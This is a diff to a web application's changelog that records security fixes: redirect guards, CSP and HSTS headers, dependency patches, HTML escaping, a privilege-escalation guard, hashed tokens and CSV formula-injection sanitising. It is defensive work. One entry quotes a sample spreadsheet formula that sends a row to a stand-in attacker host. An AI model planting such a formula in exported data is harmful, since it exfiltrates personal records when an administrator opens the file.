@@ -5,6 +5,96 @@ Format: `## [version] — YYYY-MM-DD` with bullet points per change.
 
 ---
 
+## [Unreleased] — 2026-06-10
+
+### Security
+- **JoinPending open-redirect closed** — `pages/public/JoinPending.jsx`
+  now gates `window.location.href = redirectUrl` with
+  `isSafePaymentRedirect()`, matching the existing guards on
+  `ResumePayment` and `PortalRenewal`. Defence-in-depth against a
+  compromised or mis-configured backend returning a URL outside
+  same-origin / paypal.com.
+- **CSP + HSTS headers** — `frontend/vercel.json` now ships a
+  Content-Security-Policy in report-only mode and a 2-year HSTS header
+  with `includeSubDomains; preload`. The CSP defaults are tight
+  (`script-src 'self'; object-src 'none'; frame-ancestors 'none'; …`)
+  but `connect-src 'self' https:` and `style-src` allow `'unsafe-inline'`
+  so the report-only deploy doesn't break Vite/Tailwind output. After a
+  deploy window of clean reports, switch the header key from
+  `Content-Security-Policy-Report-Only` to `Content-Security-Policy`
+  and consider tightening `connect-src` to the actual backend host.
+- **npm audit clean-up** — `npm audit fix` applied in both `backend/`
+  and `frontend/`. Backend: 7 vulnerabilities (2 high, 5 moderate) →
+  2 moderate; remaining two are `uuid<11.1.1`'s missing buffer-bounds
+  check on the v3/v5/v6 `buf` argument, which doesn't affect Beacon2's
+  v4-only usage. Frontend: 4 moderate → 0 (postcss XSS-via-CSS,
+  react-router protocol-relative open redirect, ws memory disclosure,
+  axios prototype-pollution chain). No `package.json` changes were
+  needed — patches landed via lock-file updates.
+- **HTML injection via email tokens** — `resolveTokens()` now returns a
+  `bodyHtml` variant in addition to `body`. Token values (member
+  forenames, surnames, partner fields, etc.) are HTML-escaped in
+  `bodyHtml` so a member whose forename contains markup can't smuggle
+  links or scripts into templated broadcasts that resolve their token
+  for *other* recipients (partner / shared-template paths). The
+  surrounding admin-authored body is left unescaped. `routes/email.js`
+  now uses `bodyHtml` for the html field of outgoing SendGrid messages.
+- **PayPal `initiatePayment()` refuses in production** —
+  `utils/paypal.js`, matching the chunk 4 hardening of
+  `verifyPaymentNotification()`. Throws unless `NODE_ENV !== 'production'`
+  or `PAYPAL_STUB_ALLOW=true`. Prevents the stub from issuing fake
+  payment IDs and "success" redirects in production, which would orphan
+  Applicants and mislead operators.
+- **CSV / spreadsheet formula injection defence** — new helper
+  `utils/spreadsheet.js` (`sanitizeCell`, `sanitizeRowForExport`) prefixes
+  any string starting with `=`, `+`, `-`, `@`, tab or CR with a single
+  quote so Excel/Calc/Sheets treat it as a literal. Applied to every
+  Excel/CSV export sink: full tenant backup (`backup.js`), member
+  download, group/team/calendar/gift-aid downloads, finance and groups
+  statements, address export (CSV/TSV/Excel), SQL Reports download, and
+  membership-card data export. Without this, a member named e.g.
+  `=HYPERLINK("http://attacker/?c="&A2,"click")` could exfiltrate the
+  row when an admin opened the daily backup.
+- **Restore no longer imports `password_hash` from the backup file** —
+  `routes/backup.js:restoreBeacon2`. A malicious backup could otherwise
+  plant a known-password account bound to Administration via the User
+  roles sheet. Imported users now have NULL `password_hash`; the
+  sys-admin must use "Set temporary password for all users" on the
+  tenant before they can log in. The legacy Beacon-format restore path
+  already used this pattern.
+- **PayPal stub refuses to verify in production** — `utils/paypal.js`
+  `verifyPaymentNotification()` now returns `verified: false` when
+  `NODE_ENV === 'production'` unless `PAYPAL_STUB_ALLOW=true` is explicitly
+  set. Closes the path where any unauthenticated caller could complete the
+  `/public/:slug/payment-confirm` flow (flipping an Applicant to Current
+  and recording a fake finance transaction) until real IPN verification is
+  wired up. Existing dev/test behaviour is unchanged.
+- **Portal registration forename match tightened** —
+  `routes/public.js` `/portal/register` no longer accepts a prefix match
+  for `forename`. Submitting `"J"` previously matched every member whose
+  forename began with "J"; now the full forename or the first whitespace-
+  delimited token must match exactly (case-insensitive).
+- **`portal_verification_token` now hashed at rest** — same SHA-256
+  treatment as `portal_reset_token` and `payment_token`. Covers both the
+  registration flow and the email-change re-verification path in
+  `routes/portal.js`. In-flight verification links become invalid on
+  deploy.
+- **Role-assignment privilege-escalation guard** — `POST /users`,
+  `POST /users/:id/roles`, and `DELETE /users/:id/roles/:roleId` now refuse to
+  grant or revoke a role whose privilege set includes anything the actor does
+  not themselves hold. Previously, anyone with `user_record:change` could
+  grant Administration to any user (including themselves).
+- **Hashed opaque tokens at rest** — `portal_reset_token` and `payment_token`
+  are now stored as SHA-256 hashes (via the new `hashOpaqueToken()` helper in
+  `utils/password.js`). A database leak no longer leaks usable password-reset
+  or in-flight payment-continuation tokens. Plaintext tokens are still
+  delivered to the user via the email link / API response. The portal renewal
+  metadata suffix (`hash|<base64-meta>`) is preserved unchanged.
+- **Note:** any portal password-reset link issued before deployment, and any
+  in-flight "Applicant" payment-resume link, will stop working at deploy
+  time — affected users should request a fresh link or restart the joining
+  flow.
+
 ## [Unreleased] — 2026-06-09
 
 ### Added
